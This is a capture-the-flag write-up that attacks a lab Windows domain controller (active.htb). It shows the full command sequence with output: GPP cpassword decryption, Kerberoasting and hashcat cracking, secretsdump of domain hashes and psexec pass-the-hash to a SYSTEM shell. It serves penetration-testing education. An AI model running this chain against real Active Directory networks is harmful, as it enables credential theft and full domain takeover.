# Enumeration 

As we start every assessment, in order to save time i split the port scan and the service scan into `rustscan`(Port scan) and `nmap` (Service scan). Running `rustscan` revels set of open ports `53` , `88` ,`135`, `139` `445` and more

## Rustscan 
```
rustscan -a 10.129.11.170

....

....

Open 10.129.11.170:53
Open 10.129.11.170:88
Open 10.129.11.170:135
Open 10.129.11.170:139
Open 10.129.11.170:389
Open 10.129.11.170:445
Open 10.129.11.170:464
Open 10.129.11.170:593
Open 10.129.11.170:636
Open 10.129.11.170:3268
Open 10.129.11.170:3269
Open 10.129.11.170:5722
Open 10.129.11.170:9389
Open 10.129.11.170:49153
Open 10.129.11.170:49154
Open 10.129.11.170:49152
Open 10.129.11.170:49157
Open 10.129.11.170:49155
Open 10.129.11.170:49158
Open 10.129.11.170:49162
Open 10.129.11.170:49166
Open 10.129.11.170:49168
```

## NMAP

With set of open ports, i can run `nmap` to directly scan for services in these ports, saving time on scanning unreachable ports.

```
sudo nmap 10.129.11.170 -p 53,88,135,139,389,445,464,593,636,3268,3269,5722,9389 -sCV -oN active.nmap


PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Microsoft DNS 6.1.7601 (1DB15D39) (Windows Server 2008 R2 SP1)
| dns-nsid: 
|_  bind.version: Microsoft DNS 6.1.7601 (1DB15D39)
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-03-22 07:14:15Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
5722/tcp open  msrpc         Microsoft Windows RPC
9389/tcp open  mc-nmf        .NET Message Framing
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows_server_2008:r2:sp1, cpe:/o:microsoft:windows
```

## NXC

Lets start by checking for anonymous `smb` connection, this can result is open `smb` shares and even more information leaks.

```bash
nxc smb 10.129.11.170 -u '' -p ''
SMB         10.129.11.170   445    DC               [*] Windows 7 / Server 2008 R2 Build 7601 x64 (name:DC) (domain:active.htb) (signing:True) (SMBv1:False) 
SMB         10.129.11.170   445    DC               [+] active.htb\: 
```

We can see the `[+]` which confirms that anonymous user has some anonymous abilities, lets see what directories are accessible to this user.

```bash
nxc smb 10.129.11.170 -u '' -p '' --shares
SMB         10.129.11.170   445    DC               [*] Windows 7 / Server 2008 R2 Build 7601 x64 (name:DC) (domain:active.htb) (signing:True) (SMBv1:False) 
SMB         10.129.11.170   445    DC               [+] active.htb\: 
SMB         10.129.11.170   445    DC               [*] Enumerated shares
SMB         10.129.11.170   445    DC               Share           Permissions     Remark
SMB         10.129.11.170   445    DC               -----           -----------     ------
SMB         10.129.11.170   445    DC               ADMIN$                          Remote Admin
SMB         10.129.11.170   445    DC               C$                              Default share
SMB         10.129.11.170   445    DC               IPC$                            Remote IPC
SMB         10.129.11.170   445    DC               NETLOGON                        Logon server share 
SMB         10.129.11.170   445    DC               Replication     READ            
SMB         10.129.11.170   445    DC               SYSVOL                          Logon server share 
SMB         10.129.11.170   445    DC               Users                           
```

There is only one readable share which is `Replication`.
## SMBClient

To interact with the `smb` protocol on port `445`, i personally like using `smbclinet` by `impacket`. it has nice `ui` to switch between shares without logging out. We can list shares with the `shares` command , the we can use `use` to select a share, then i use `ls` to list the files/directories in a share.

```bash
impacket-smbclient active.htb/''@10.129.11.170
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

Type help for list of commands
# shares
ADMIN$
C$
IPC$
NETLOGON
Replication
SYSVOL
Users
# use Replication
# ls
drw-rw-rw-          0  Sat Jul 21 13:37:44 2018 .
drw-rw-rw-          0  Sat Jul 21 13:37:44 2018 ..
drw-rw-rw-          0  Sat Jul 21 13:37:44 2018 active.htb
# cd active.htb
# ls
drw-rw-rw-          0  Sat Jul 21 13:37:44 2018 .
drw-rw-rw-          0  Sat Jul 21 13:37:44 2018 ..
drw-rw-rw-          0  Sat Jul 21 13:37:44 2018 DfsrPrivate
drw-rw-rw-          0  Sat Jul 21 13:37:44 2018 Policies
drw-rw-rw-          0  Sat Jul 21 13:37:44 2018 scripts
```

Inside the `Replication` share there is one directory called with the name if of the domain, inside the directory, listed 3 more directories `Policies` , `scripts` and `DfsrPrivate` , this looks like a `SYSVOL` folder, which is probably a replication of.

### About the SYSVOL Folder
[netwrix](https://netwrix.com/en/resources/blog/sysvol-directory/)
```
The system volume (SYSVOL) is a special directory on each DC. It is made up of several folders with one being shared and referred to as the SYSVOL share.
```

Inside the SYSVOL directory we can often find a lot of information, about users, computers, policies, preferences and sometimes even passwords. 

```
# cd Policies
# ls
drw-rw-rw-          0  Sat Jul 21 13:37:44 2018 .
drw-rw-rw-          0  Sat Jul 21 13:37:44 2018 ..
drw-rw-rw-          0  Sat Jul 21 13:37:44 2018 {31B2F340-016D-11D2-945F-00C04FB984F9}
drw-rw-rw-          0  Sat Jul 21 13:37:44 2018 {6AC1786C-016F-11D2-945F-00C04fB984F9}
# cd {31B2F340-016D-11D2-945F-00C04FB984F9}
# ls
drw-rw-rw-          0  Sat Jul 21 13:37:44 2018 .
drw-rw-rw-          0  Sat Jul 21 13:37:44 2018 ..
-rw-rw-rw-         23  Sat Jul 21 13:38:11 2018 GPT.INI
drw-rw-rw-          0  Sat Jul 21 13:37:44 2018 Group Policy
drw-rw-rw-          0  Sat Jul 21 13:37:44 2018 MACHINE
drw-rw-rw-          0  Sat Jul 21 13:37:44 2018 USER
# cd ../{6AC1786C-016F-11D2-945F-00C04fB984F9}
# ls
drw-rw-rw-          0  Sat Jul 21 13:37:44 2018 .
drw-rw-rw-          0  Sat Jul 21 13:37:44 2018 ..
-rw-rw-rw-         22  Sat Jul 21 13:38:11 2018 GPT.INI
drw-rw-rw-          0  Sat Jul 21 13:37:44 2018 MACHINE
drw-rw-rw-          0  Sat Jul 21 13:37:44 2018 USER
```

I found two polices, under one of them i found the `groups.xml` file:

```bash
# cd Machine
# ls
drw-rw-rw-          0  Sat Jul 21 13:37:44 2018 .
drw-rw-rw-          0  Sat Jul 21 13:37:44 2018 ..
drw-rw-rw-          0  Sat Jul 21 13:37:44 2018 Microsoft
drw-rw-rw-          0  Sat Jul 21 13:37:44 2018 Preferences
-rw-rw-rw-       2788  Sat Jul 21 13:38:11 2018 Registry.pol

# cd Preferences
# ls
drw-rw-rw-          0  Sat Jul 21 13:37:44 2018 .
drw-rw-rw-          0  Sat Jul 21 13:37:44 2018 ..
drw-rw-rw-          0  Sat Jul 21 13:37:44 2018 Groups

# cd Groups
# ls
drw-rw-rw-          0  Sat Jul 21 13:37:44 2018 .
drw-rw-rw-          0  Sat Jul 21 13:37:44 2018 ..
-rw-rw-rw-        533  Sat Jul 21 13:38:11 2018 Groups.xml

# get Groups.xml
```

### Groups.XML

```
Group Policies for account management are stored on the Domain Controller in "Groups.xml" files buried in the SYSVOL folder.... what we are interested in as pen testers are files that contain the "cpassword" field.
```

IT administrators can govern the domain via group policy which can set a preference over an organizational unit instead of per user settings. The `groups.xml` file is created when an admin configures `Local Users and Groups` via GPO Preferences, the file may contain a `cpassword` field, which is `AES` encrypted using a publicly known key, making it trivially decryptable. Lets print the `xml` file :   

```bash
> cat Groups.xml


<?xml version="1.0" encoding="utf-8"?>
<Groups clsid="{3125E937-EB16-4b4c-9934-544FC6D24D26}"><User clsid="{DF5F1855-51E5-4d24-8B1A-D9BDE98BA1D1}" name="active.htb\SVC_TGS" image="2" changed="2018-07-18 20:46:06" uid="{EF57DA28-5F69-4530-A59E-AAB58578219D}"><Properties action="U" newName="" fullName="" description="" cpassword="edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ" changeLogon="0" noChange="1" neverExpires="1" acctDisabled="0" userName="active.htb\SVC_TGS"/></User>
</Groups>
```

cpassword - 
```
edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ
```

### GPP-Decrypt

We can use the `gpp-decrypt` tool to decrypt the password , the password was decrypted to `GPPstillStandingStrong2k18`.

```bash
> gpp-decrypt edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ

GPPstillStandingStrong2k18
```

# User Validate - Initial Connection

Now we should check to see if the new username password we have obtained are valid. I checked against the `smb` protocol as this machine doesn't have any remote connection services open like `winrm` or `RDP`. 

```bash
> nxc smb 10.129.11.170 -u svc_tgs -p GPPstillStandingStrong2k18


SMB         10.129.11.170   445    DC               [*] Windows 7 / Server 2008 R2 Build 7601 x64 (name:DC) (domain:active.htb) (signing:True) (SMBv1:False) 
SMB         10.129.11.170   445    DC               [+] active.htb\svc_tgs:GPPstillStandingStrong2k18 
```

The user was found valid, this new user has few more `smb` shares read permission than the anonymous user.

```bash
> nxc smb 10.129.11.170 -u 'svc_tgs' -p 'GPPstillStandingStrong2k18' --shares

...

SMB         10.129.11.170   445    DC               Share           Permissions     Remark
SMB         10.129.11.170   445    DC               -----           -----------     ------
SMB         10.129.11.170   445    DC               ADMIN$                          Remote Admin
SMB         10.129.11.170   445    DC               C$                              Default share
SMB         10.129.11.170   445    DC               IPC$                            Remote IPC
SMB         10.129.11.170   445    DC               NETLOGON        READ            Logon server share 
SMB         10.129.11.170   445    DC               Replication     READ            
SMB         10.129.11.170   445    DC               SYSVOL          READ            Logon server share 
SMB         10.129.11.170   445    DC               Users           READ
```

The users directory is now readable and we can use it to get the `user.txt`

```bash
> impacket-smbclient active.htb/'svc_tgs':'GPPstillStandingStrong2k18'@10.129.11.170

...

Type help for list of commands
# use Users
# ls
drw-rw-rw-          0  Sat Jul 21 17:39:20 2018 .
drw-rw-rw-          0  Sat Jul 21 17:39:20 2018 ..
drw-rw-rw-          0  Mon Jul 16 13:14:21 2018 Administrator
drw-rw-rw-          0  Tue Jul 17 00:08:56 2018 All Users
drw-rw-rw-          0  Tue Jul 17 00:08:47 2018 Default
drw-rw-rw-          0  Tue Jul 17 00:08:56 2018 Default User
-rw-rw-rw-        174  Tue Jul 17 00:01:17 2018 desktop.ini
drw-rw-rw-          0  Tue Jul 17 00:08:47 2018 Public
drw-rw-rw-          0  Sat Jul 21 18:16:32 2018 SVC_TGS
# cd SVC_TGS/Desktop
# ls
drw-rw-rw-          0  Sat Jul 21 18:14:42 2018 .
drw-rw-rw-          0  Sat Jul 21 18:14:42 2018 ..
-rw-rw-rw-         34  Sun Mar 22 09:11:16 2026 user.txt
```

# Domain - Privesc

With a valid domain user, we can continue and search for interesting domain lateral movement attack vectors, lets start by searching for kerberoastable users: 

## Kerberoast

[Pentestly.io](https://www.pentestly.io/blog/how-to-attack-kerberos-101)
```
Kerberoasting is an extremely common attack in active directory environments which targets Active Directory accounts with the SPN value set.
Kerberoasting involves requesting a Kerb Service Ticket (TGS) from a Windows Domain Machine or Kali Box using something like GetUserSPN's.py. The problem with TGS is once the the DC looks up the target SPN it encrypts the TGS with the NTLM Password Hash of the targeted user account.
```

Servers (Services) that supports kerberos authentication is granted with an `SPN`, the idea here is that only authenticated and permitted user can ask for an `spn` that the user can authenticate to the service with. This `SPN` is encrypted with the service user password, if the password is common and easy to crack, we will be granted with a service user which most of the time is pretty powerful. To emulate this attack we will use `impacket-GetUserSPNs` which checks to see if our current user can obtain any `SPN` , if it allowed, then we will receive a hash we can try to crack offline. 


```bash
> impacket-GetUserSPNs active.htb/'SVC_TGS':'GPPstillStandingStrong2k18'  -dc-ip 10.129.11.170  -request

....


ServicePrincipalName  Name           MemberOf                                                  PasswordLastSet             LastLogon                   Delegation 
--------------------  -------------  --------------------------------------------------------  --------------------------  --------------------------  ----------
active/CIFS:445       Administrator  CN=Group Policy Creator Owners,CN=Users,DC=active,DC=htb  2018-07-18 22:06:40.351723  2026-03-22 09:11:18.230142             



[-] CCache file is not found. Skipping...
$krb5tgs$23$*Administrator$ACTIVE.HTB$active.htb/Administrator*$24035490909a5973739faa84a403d65d$ece5a6ec4ab917143d212f2a9c66db030abafe7ca552df5c0c1c6300360c2d26fa5bae7065253bd93c44cd94b62949c346872ccdf085e23f8167fa246dcc4f36f4ab68675be19450ac29162e3f2667473308edb6a743aca396257c74e2fe30d5ff5ef8e21f532b0730ff4152c13e8443b99a1ee24e9daa10de934a829cd9cbd95965d5a9b7edfcb79112c76ef02053a47cf988fa684a5be8c0c25940fb4cd9b0db488d4dc8177ce3a7fda1cd52355e3cb344e7c23d4c22c976709078a982ab51d68854be09a5b1a392bf4af8999315d13354ddd82bdc11da4769ccd76b05378046b474966acb737d18cfecd2a97e2184449eb232c9843a6095818461fab524f490ac437c27c5c2e8a560b8ea5f094b8e4a917721f860c98e96a11f9d518c0aee54668addd0cef820749862ff6ce84473dbfe40c4ba56d365a47047a8eddae5742d61c89e8e2ba677db3a122a09d1ec671285de1504391fbbf3b1ef1867ed3964d2696bd500fdff7c31c7036865e2e5121b385a01a381ca222bed4d0aaa5dde1d1e01e5de3b7fc81bceb91ae160553f3a0b9038826fc80356492a988e99f4c0adc4e91f8ffa35649c0ae8c2918786ee2d3c3fc09e086ee5ba2141a0bd4981c5f707e154928596b78fa0e2de3c759af2081b19bc29d12f2d638c154d40704ac20943661a7fcd48d18590d543b28d69bef746070ea8ef40f72b80354113fb52135fd349cf48f3180646838006d485d891cc9bcace5a8d4215c68bddfa4109fa11001e99fa6352cade5a1afc8854b7487535e6e9d0a70987935cd89edcab5ecf2ad38246ed5452da17ce9763387b7470ea303cd84e7c7f818e1c2a888ca2895e8b20153f74d95332ef62620c1f99387a50a5a389d3947a03cfef41aed0ffcd4da90df22ae613594251288ac638181673cd1e3f9bd811b0cad05d7a7fddc57baab992346f62e9f31c5636a99fd2f314418ee0ebb9d79e864f744b7fe076f84f7f1005b7c15b630140a35f738ce8ac5c1b397f7fe781d2d8741c2ea1c3ab8febc9a74f271c12c7e3b18b4dc8ec5e605e50b175eab19a16c5ba99fb14e28134a1aa90bc1cd8baaa6c7a6220fe9b45a409f1e3bd43e000fff73c0587f05095417a2fd618060a68ce52a7327724e26ce392a41b3260e29936c24d6d8aadbc29e2678deba8c4ad1b1e08a8f90c4e1e7efbc7631590dfed65e16c87b2cae112bbe553bc47ddd9082567e8841440186f53ef002a6f49fbc279ddf9f2f86efb36
```

The `Administrator` account has a (`SPN`) assigned.   This is a misconfiguration, as `SPNs` are intended for service accounts, not highly privileged user accounts.
## Hashcat

We will use `hashcat` for this cracking campaign, first lets copy the hash into a file:  

```bash
echo '$krb5tgs$23$*Administrator$ACTIVE.HTB$active.htb/Administrator*$24035490909a5973739faa84a403d65d$ece5a6ec4ab917143d212f2a9c66db030abafe7ca552df5c0c1c6300360c2d26fa5bae7065253bd93c44cd94b62949c346872ccdf085e23f8167fa246dcc4f36f4ab68675be19450ac29162e3f2667473308edb6a743aca396257c74e2fe30d5ff5ef8e21f532b0730ff4152c13e8443b99a1ee24e9daa10de934a829cd9cbd95965d5a9b7edfcb79112c76ef02053a47cf988fa684a5be8c0c25940fb4cd9b0db488d4dc8177ce3a7fda1cd52355e3cb344e7c23d4c22c976709078a982ab51d68854be09a5b1a392bf4af8999315d13354ddd82bdc11da4769ccd76b05378046b474966acb737d18cfecd2a97e2184449eb232c9843a6095818461fab524f490ac437c27c5c2e8a560b8ea5f094b8e4a917721f860c98e96a11f9d518c0aee54668addd0cef820749862ff6ce84473dbfe40c4ba56d365a47047a8eddae5742d61c89e8e2ba677db3a122a09d1ec671285de1504391fbbf3b1ef1867ed3964d2696bd500fdff7c31c7036865e2e5121b385a01a381ca222bed4d0aaa5dde1d1e01e5de3b7fc81bceb91ae160553f3a0b9038826fc80356492a988e99f4c0adc4e91f8ffa35649c0ae8c2918786ee2d3c3fc09e086ee5ba2141a0bd4981c5f707e154928596b78fa0e2de3c759af2081b19bc29d12f2d638c154d40704ac20943661a7fcd48d18590d543b28d69bef746070ea8ef40f72b80354113fb52135fd349cf48f3180646838006d485d891cc9bcace5a8d4215c68bddfa4109fa11001e99fa6352cade5a1afc8854b7487535e6e9d0a70987935cd89edcab5ecf2ad38246ed5452da17ce9763387b7470ea303cd84e7c7f818e1c2a888ca2895e8b20153f74d95332ef62620c1f99387a50a5a389d3947a03cfef41aed0ffcd4da90df22ae613594251288ac638181673cd1e3f9bd811b0cad05d7a7fddc57baab992346f62e9f31c5636a99fd2f314418ee0ebb9d79e864f744b7fe076f84f7f1005b7c15b630140a35f738ce8ac5c1b397f7fe781d2d8741c2ea1c3ab8febc9a74f271c12c7e3b18b4dc8ec5e605e50b175eab19a16c5ba99fb14e28134a1aa90bc1cd8baaa6c7a6220fe9b45a409f1e3bd43e000fff73c0587f05095417a2fd618060a68ce52a7327724e26ce392a41b3260e29936c24d6d8aadbc29e2678deba8c4ad1b1e08a8f90c4e1e7efbc7631590dfed65e16c87b2cae112bbe553bc47ddd9082567e8841440186f53ef002a6f49fbc279ddf9f2f86efb36' > hash 
```

Then we will run `hashcat` with mode `13100` for this hash type.

```bash
hashcat -m 13100 hash /usr/share/wordlists/rockyou.txt

.....

$krb5tgs$23$*Administrator$ACTIVE.HTB$active.htb/Administrator*$24035490909a5973739faa84a403d65d$ece5a6ec4ab917143d212f2a9c66db030abafe7ca552df5c0c1c6300360c2d26fa5bae7065253bd93c44cd94b62949c346872ccdf085e23f8167fa246dcc4f36f4ab68675be19450ac29162e3f2667473308edb6a743aca396257c74e2fe30d5ff5ef8e21f532b0730ff4152c13e8443b99a1ee24e9daa10de934a829cd9cbd95965d5a9b7edfcb79112c76ef02053a47cf988fa684a5be8c0c25940fb4cd9b0db488d4dc8177ce3a7fda1cd52355e3cb344e7c23d4c22c976709078a982ab51d68854be09a5b1a392bf4af8999315d13354ddd82bdc11da4769ccd76b05378046b474966acb737d18cfecd2a97e2184449eb232c9843a6095818461fab524f490ac437c27c5c2e8a560b8ea5f094b8e4a917721f860c98e96a11f9d518c0aee54668addd0cef820749862ff6ce84473dbfe40c4ba56d365a47047a8eddae5742d61c89e8e2ba677db3a122a09d1ec671285de1504391fbbf3b1ef1867ed3964d2696bd500fdff7c31c7036865e2e5121b385a01a381ca222bed4d0aaa5dde1d1e01e5de3b7fc81bceb91ae160553f3a0b9038826fc80356492a988e99f4c0adc4e91f8ffa35649c0ae8c2918786ee2d3c3fc09e086ee5ba2141a0bd4981c5f707e154928596b78fa0e2de3c759af2081b19bc29d12f2d638c154d40704ac20943661a7fcd48d18590d543b28d69bef746070ea8ef40f72b80354113fb52135fd349cf48f3180646838006d485d891cc9bcace5a8d4215c68bddfa4109fa11001e99fa6352cade5a1afc8854b7487535e6e9d0a70987935cd89edcab5ecf2ad38246ed5452da17ce9763387b7470ea303cd84e7c7f818e1c2a888ca2895e8b20153f74d95332ef62620c1f99387a50a5a389d3947a03cfef41aed0ffcd4da90df22ae613594251288ac638181673cd1e3f9bd811b0cad05d7a7fddc57baab992346f62e9f31c5636a99fd2f314418ee0ebb9d79e864f744b7fe076f84f7f1005b7c15b630140a35f738ce8ac5c1b397f7fe781d2d8741c2ea1c3ab8febc9a74f271c12c7e3b18b4dc8ec5e605e50b175eab19a16c5ba99fb14e28134a1aa90bc1cd8baaa6c7a6220fe9b45a409f1e3bd43e000fff73c0587f05095417a2fd618060a68ce52a7327724e26ce392a41b3260e29936c24d6d8aadbc29e2678deba8c4ad1b1e08a8f90c4e1e7efbc7631590dfed65e16c87b2cae112bbe553bc47ddd9082567e8841440186f53ef002a6f49fbc279ddf9f2f86efb36:Ticketmaster1968
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 13100 (Kerberos 5, etype 23, TGS-REP)
Hash.Target......: $krb5tgs$23$*Administrator$ACTIVE.HTB$active.htb/Ad...6efb36
Time.Started.....: Sun Mar 22 09:32:46 2026 (17 secs)
Time.Estimated...: Sun Mar 22 09:33:03 2026 (0 secs)
Kernel.Feature...: Pure Kernel (password length 0-256 bytes)
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#01........:   705.2 kH/s (5.57ms) @ Accel:1024 Loops:1 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 10543104/14344385 (73.50%)
Rejected.........: 0/10543104 (0.00%)
Restore.Point....: 10534912/14344385 (73.44%)
Restore.Sub.#01..: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#01...: Tioncurtis23 -> Teague51
Hardware.Mon.#01.: Util: 56%

Started: Sun Mar 22 09:32:35 2026
Stopped: Sun Mar 22 09:33:05 2026
```

The hash was cracked into the password : `Ticketmaster1968`, Lets validate this user before calling a day:

```bash
> nxc smb 10.129.11.170 -u administrator -p Ticketmaster1968

     
SMB         10.129.11.170   445    DC               [*] Windows 7 / Server 2008 R2 Build 7601 x64 (name:DC) (domain:active.htb) (signing:True) (SMBv1:False) 
SMB         10.129.11.170   445    DC               [+] active.htb\administrator:Ticketmaster1968 (Pwn3d!)
```

The user was validated and confirmed. with the administrator user we can perform secrets dump to get password of the entire domain:

```bash
impacket-secretsdump active.htb/administrator:'Ticketmaster1968'@10.129.11.170
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

...

[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:5ffb4aaaf9b63dc519eca04aec0e8bed:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:b889e0d47d6fe22c8f0463a717f460dc:::
active.htb\SVC_TGS:1103:aad3b435b51404eeaad3b435b51404ee:f54f3a1d3c38140684ff4dad029f25b5:::
DC$:1000:aad3b435b51404eeaad3b435b51404ee:6e3eecf55eb56201754eab0410561bc3:::


[*] Kerberos keys grabbed
Administrator:aes256-cts-hmac-sha1-96:003b207686cfdbee91ff9f5671aa10c5d940137da387173507b7ff00648b40d8
Administrator:aes128-cts-hmac-sha1-96:48347871a9f7c5346c356d76313668fe
Administrator:des-cbc-md5:5891549b31f2c294
krbtgt:aes256-cts-hmac-sha1-96:cd80d318efb2f8752767cd619731b6705cf59df462900fb37310b662c9cf51e9
krbtgt:aes128-cts-hmac-sha1-96:b9a02d7bd319781bc1e0a890f69304c3
krbtgt:des-cbc-md5:9d044f891adf7629
active.htb\SVC_TGS:aes256-cts-hmac-sha1-96:d59943174b17c1a4ced88cc24855ef242ad328201126d296bb66aa9588e19b4a
active.htb\SVC_TGS:aes128-cts-hmac-sha1-96:f03559334c1111d6f792d74a453d6f31
active.htb\SVC_TGS:des-cbc-md5:d6c7eca70862f1d0
DC$:aes256-cts-hmac-sha1-96:0636f1822ee0037755a45507a0b88ecbc855516eea09cbd6315e163acbc1b2b6
DC$:aes128-cts-hmac-sha1-96:59b075feaed2820e773c2117f364316a
DC$:des-cbc-md5:02861ca1a71907a1
[*] Cleaning up...
```


# Obtaining System

With the administrator hash we can connect to the machine via `psexec` and obtain proper system shell.

```bash
> impacket-psexec active.htb/administrator@10.129.11.170 -hashes :5ffb4aaaf9b63dc519eca04aec0e8bed

....

[*] Requesting shares on 10.129.11.170.....
[*] Found writable share ADMIN$
[*] Uploading file CmTszSxm.exe
[*] Opening SVCManager on 10.129.11.170.....
[*] Creating service cAwk on 10.129.11.170.....
[*] Starting service cAwk.....
[!] Press help for extra shell commands
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

> C:\Windows\system32> whoami


nt authority\system
```